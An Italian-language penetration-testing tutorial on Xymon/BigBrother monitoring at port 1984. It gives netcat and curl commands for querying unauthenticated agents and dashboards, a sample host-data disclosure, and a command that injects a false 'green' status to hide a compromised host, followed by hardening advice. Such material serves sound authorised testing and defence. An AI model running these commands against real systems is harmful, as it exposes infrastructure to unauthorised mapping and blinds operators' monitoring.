---
title: 'Porta 1984 Xymon/BigBrother: Recon e Info Disclosure'
slug: porta-1984-bigbrother
description: 'Porta 1984 Xymon e BigBrother nel pentest: agent monitoring, host data disclosure, servizi esposti e dashboard infrastrutturale accessibile senza adeguati controlli.'
image: /porta-1984-bigbrother-xymon.webp
draft: true
date: 2026-04-12T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - Xymon
  - Big Brother
  - Monitoring Recon
---

> **Executive Summary** — La porta 1984 è associata a BigBrother (ora Xymon/Hobbit), un sistema di monitoring infrastrutturale legacy ma ancora presente in molti ambienti enterprise e PA. Gli agent di monitoring sulla 1984 raccolgono e trasmettono dati su CPU, memoria, disco, servizi, processi e configurazione di ogni host monitorato. Un server Xymon/BigBrother compromesso o esposto rivela l'intera mappa dell'infrastruttura con lo stato di ogni servizio — la recon più completa possibile.

**Cos’è la porta 1984 (BigBrother / Xymon)**

* La porta 1984 indica un agent di monitoring BigBrother/Xymon — ogni host monitorato espone dati sulla propria configurazione
* Il server Xymon ha una web interface che mostra lo stato di TUTTA l'infrastruttura — hostname, IP, servizi, alert
* I messaggi di status contengono output di comandi (df, ps, netstat) — information disclosure completa

Porta 1984 BigBrother è il canale TCP usato dagli agent Xymon/BigBrother per inviare status report al server di monitoring. La porta 1984 vulnerabilità principali sono l'assenza di autenticazione (gli agent accettano query senza credenziali), l'information disclosure (configurazione host, servizi, processi) e l'accesso alla web interface del server senza auth. L'enumerazione porta 1984 rivela la configurazione dell'host monitorato. Un server Xymon è una mappa interattiva dell'intera infrastruttura.

## 1. Anatomia Tecnica

| Componente         | Porta        | Ruolo                               |
| ------------------ | ------------ | ----------------------------------- |
| **Xymon/BB Agent** | **1984/TCP** | **Riceve query e invia status**     |
| Xymon Server       | 1984/TCP     | Raccoglie status da tutti gli agent |
| Web Interface      | 80/443       | Dashboard stato infrastruttura      |

L'agent sulla 1984 accetta comandi in formato testo semplice senza autenticazione:

```
Misconfig: Agent sulla 1984 risponde a qualsiasi host
Impatto: information disclosure — configurazione, servizi, processi dell'host
Come si verifica: echo "client" | nc [target] 1984 — se risponde, è aperto
```

```
Misconfig: Web interface Xymon senza autenticazione
Impatto: mappa completa dell'infrastruttura con stato di ogni servizio su ogni host
Come si verifica: curl http://[xymon_server]/xymon/ — se mostra la dashboard, è aperto
```

## 2. Enumerazione

### Query all'agent

```bash
echo "client" | nc 10.10.10.50 1984
```

**Output:**

```
[client]
hostname=webserver01.corp.local
os=Linux 5.15.0-91-generic
uptime=45 days

[cpu]
user=12% system=5% idle=83%

[disk]
/dev/sda1  50G  32G  18G  64%  /
/dev/sda2 200G 180G  20G  90%  /data

[procs]
root     1234 apache2
root     5678 sshd
mysql    9012 mysqld
www-data 3456 php-fpm

[ports]
tcp 0.0.0.0:22    LISTEN
tcp 0.0.0.0:80    LISTEN
tcp 0.0.0.0:443   LISTEN
tcp 0.0.0.0:3306  LISTEN
tcp 127.0.0.1:6379 LISTEN
```

**Lettura dell'output:** configurazione completa dell'host — OS, disco (90% su /data — quasi pieno), processi (Apache, SSH, MySQL, PHP-FPM), porte in ascolto (SSH, HTTP, HTTPS, MySQL pubblico, Redis solo localhost). Questa è la recon più dettagliata possibile su un host. Per la [compromissione dei servizi esposti](https://hackita.it/articoli/porta-1433-mssql), MySQL sulla 3306 e Apache sulla 80 sono i target.

### Web interface Xymon server

```bash
curl -s http://10.10.10.5/xymon/
```

**Output (se accessibile):** dashboard HTML con la griglia di tutti gli host e lo stato di ogni servizio (verde/giallo/rosso). Ogni host è cliccabile per i dettagli completi.

**Cosa rivela:** hostname, IP, servizi attivi, alert correnti, trend di performance. È la mappa completa dell'infrastruttura — l'equivalente di un CMDB esposto senza autenticazione.

## 3. Tecniche Offensive

**Recon massiva via Xymon web**

```bash
# Estrai tutti gli hostname dalla dashboard
curl -s http://10.10.10.5/xymon/ | grep -oP 'hostname=[^"]*' | sort -u

# Estrai dettagli di un host specifico
curl -s "http://10.10.10.5/xymon/svcstatus.sh?HOST=dc01.corp.local&SERVICE=info"
```

**Injection di falso status (se il server accetta input non autenticati)**

```bash
# Invia un falso status per un host
echo "status webserver01.corp.local.cpu green $(date) CPU: all good" | nc 10.10.10.5 1984
```

**Cosa fai dopo:** il falso status nasconde un problema reale — l'host potrebbe essere compromesso senza che il monitoring lo segnali. Documenta come finding: il monitoring accetta status da qualsiasi fonte.

## 4. Cheat Sheet Finale

| Azione        | Comando                                                              |
| ------------- | -------------------------------------------------------------------- |
| Scan          | `nmap -sV -p 1984 [target]`                                          |
| Query agent   | `echo "client" \| nc [target] 1984`                                  |
| Web dashboard | `curl http://[xymon_server]/xymon/`                                  |
| Host info     | `curl "http://[server]/xymon/svcstatus.sh?HOST=[host]&SERVICE=info"` |
| Inject status | `echo "status [host].cpu green ..." \| nc [server] 1984`             |

### Perché Porta 1984 è rilevante

Xymon/BigBrother è ancora presente in enterprise e PA. L'agent sulla 1984 è una finestra aperta sulla configurazione dell'host. Il server web è la mappa completa dell'infrastruttura. Finding: information disclosure massiva senza autenticazione.

### Hardening

* Firewall: limita la 1984 a soli IP del server Xymon
* Web interface: autenticazione obbligatoria
* Agent: configura `allow` per accettare query solo dal server
* Considera la migrazione a monitoring moderno (Prometheus, Zabbix) con TLS e auth

***

Riferimento: Xymon documentation. Uso esclusivo in ambienti autorizzati.

> [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
